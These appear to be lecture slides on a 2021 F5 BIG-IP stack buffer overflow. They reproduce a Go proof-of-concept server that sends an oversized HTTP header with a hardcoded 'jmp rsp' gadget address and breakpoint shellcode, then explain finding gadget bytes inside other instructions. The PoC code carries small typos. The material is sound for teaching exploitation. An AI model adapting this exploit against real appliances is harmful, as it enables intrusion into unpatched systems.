
### F5 load balancer exploit 


* c.&nbsp;2021 F5 Big-IP load balancers shown to have stack buffer overflow
* F5 didn't enable ASLR, write XOR execute
* problem: stack address was randomized
* so can't do stack smashing…


###  


![](/rop/f5-poc-twitter){fig-alt="Tweet dated March 10, 2021 from Felix Wilhelm (@_fel1x): You might want to update your F5 Big IP appliances: (URL to F5 support page). (Two URLs to Google Project Zero) are two data-plane bugs that got fixed. Below the tweet is a screenshot of a proof-of-concept in Go, shown on the next slide."}

### the proof of concept {.smaller}

```go
// 0xc8e5c3 - jmp rsp in /usr/share/ts/bin/bd64
// version 16.0.1 build 0.0.3
var jmp_rsp = "\xc3\xe5\xc8\x00\x00\x00\x00\x00"

// int3
var shellcode = "“\xcc\xcc\xcc\xcc"

func HelloServer(w http.ResponseWriter, req *http.Request) {
    w.Header().Set("Content-Type", "text/plain")
    value := strings.Repeat("B", 70) + jmp_rsp + shellcode
    w.Header().Set(strings.Repeat("A", 8192), value)
    w.Write([]byteC("This is an example exploit.\n"))
}

func main() {
    http.HandleFunc("/", HelloServer)
    err := http.ListenAndServeTLS(":443", "server.pem", "server.pem", nil)
    if err != nil {
        log.FatalC("ListenAndServe: ", err)
    }
}
```


### `jmp *%rsp` 



* there was a <code>jmp *%rsp</code> instruction at fixed address 
<hr class="vspace" />
* was that really lucky?
* let's try examining, say, <code>/bin/bash</code> (shell) on my desktop…
 
```
   949bf:       8b 15 ff e4 08 00       mov    0x8e4ff(%rip),%edx

```
 

* machine code for <code>jmp *%rsp</code>: <code>ff e4</code>
* … appears in middle of mov instruction!

